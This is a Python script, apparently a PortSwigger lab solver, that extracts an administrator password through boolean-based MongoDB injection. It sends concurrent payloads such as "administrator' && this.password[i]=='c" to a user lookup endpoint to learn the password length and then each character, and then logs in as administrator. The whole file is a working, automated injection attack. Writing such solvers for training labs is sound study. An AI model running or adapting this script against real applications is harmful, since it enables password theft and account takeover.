#!/usr/bin/env python3
"""
nosql_extract.py — PortSwigger NoSQL Injection Lab Solver
Extracts administrator password via boolean-based MongoDB injection.

Usage:
    python3 nosql_extract.py <LAB_URL>
    python3 nosql_extract.py <LAB_URL> --debug     ← see raw responses

Author: Yami05 | https://github.com/YAMI05-05
Lab   : https://portswigger.net/web-security/nosql-injection
"""

import asyncio
import aiohttp
import string
import sys
from urllib.parse import quote
from bs4 import BeautifulSoup

# ── Constants ──────────────────────────────────────────────────────────────────
CREDS       = ("wiener", "peter")
CHARSET     = string.ascii_lowercase
MAX_LEN     = 30
CONCURRENCY = 20
DEBUG       = "--debug" in sys.argv


# ── Helpers ────────────────────────────────────────────────────────────────────
async def get_csrf(session: aiohttp.ClientSession, url: str) -> str:
    async with session.get(url, ssl=False) as r:
        soup = BeautifulSoup(await r.text(), "html.parser")
        token = soup.find("input", {"name": "csrf"})
        if not token:
            sys.exit("[-] CSRF token not found")
        return token["value"]


async def login(session: aiohttp.ClientSession, user: str, pwd: str) -> bool:
    csrf = await get_csrf(session, f"{LAB_URL}/login")
    async with session.post(
        f"{LAB_URL}/login",
        data={"username": user, "password": pwd, "csrf": csrf},
        allow_redirects=True, ssl=False,
    ) as r:
        return "Log out" in await r.text()


async def inject(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload: str) -> tuple[bool, str]:
    """Returns (user_found, raw_html)."""
    async with sem:
        async with session.get(
            f"{LAB_URL}/user/lookup?user={quote(payload)}", ssl=False
        ) as r:
            html = await r.text()
            soup = BeautifulSoup(html, "html.parser")
            body = soup.get_text(" ", strip=True).lower()
            found = "could not find" not in body and "error" not in body[:300].lower()
            return found, html


async def check(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload: str) -> bool:
    found, html = await inject(session, sem, payload)
    if DEBUG:
        print(f"\n[DEBUG] payload : {payload}")
        print(f"[DEBUG] found   : {found}")
        print(f"[DEBUG] snippet : {html[:400]}\n")
    return found


# ── Core ───────────────────────────────────────────────────────────────────────
async def find_length(session: aiohttp.ClientSession, sem: asyncio.Semaphore) -> int:
    print("[*] Finding password length...")

    # Verify injection works at all: known-true vs known-false
    true_resp  = await check(session, sem, "administrator' && '1'=='1")
    false_resp = await check(session, sem, "administrator' && '1'=='2")

    if DEBUG:
        print(f"[DEBUG] true condition  → found={true_resp}")
        print(f"[DEBUG] false condition → found={false_resp}")

    if true_resp == false_resp:
        sys.exit("[-] Boolean injection not working — responses are identical")

    tasks = {
        n: asyncio.create_task(check(
            session, sem,
            f"administrator' && this.password.length == {n} || 'a'=='b"
        ))
        for n in range(1, MAX_LEN + 1)
    }

    results = await asyncio.gather(*tasks.values())
    for n, hit in zip(tasks.keys(), results):
        if hit:
            print(f"[+] Length: {n}")
            return n

    sys.exit("[-] Could not determine password length")


async def extract_password(session: aiohttp.ClientSession, sem: asyncio.Semaphore, length: int) -> str:
    print(f"[*] Extracting password ({length * len(CHARSET)} requests)...")

    tasks = {
        (i, c): asyncio.create_task(check(
            session, sem,
            f"administrator' && this.password[{i}]=='{c}"
        ))
        for i in range(length) for c in CHARSET
    }

    password = ["?"] * length
    for (i, c), task in tasks.items():
        if await task:
            password[i] = c

    result = "".join(password)
    if "?" in result:
        sys.exit(f"[-] Incomplete: {result}")
    return result


# ── Main ───────────────────────────────────────────────────────────────────────
async def main():
    print(f"[*] Target: {LAB_URL}\n")

    sem       = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY)

    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"[*] Logging in as {CREDS[0]} ...")
        if not await login(session, *CREDS):
            sys.exit("[-] Login failed — check LAB_URL")
        print("[+] Session OK\n")

        length   = await find_length(session, sem)
        password = await extract_password(session, sem, length)
        print(f"\n[+] Password: {password}")

        print("[*] Logging in as administrator ...")
        if await login(session, "administrator", password):
            print(f"[✓] Solved! → administrator : {password}")
        else:
            print(f"[!] Manual login → administrator : {password}")


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if not args:
        sys.exit("Usage: python3 nosql_extract.py <LAB_URL> [--debug]")
    LAB_URL = args[0].rstrip("/")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Aborted")
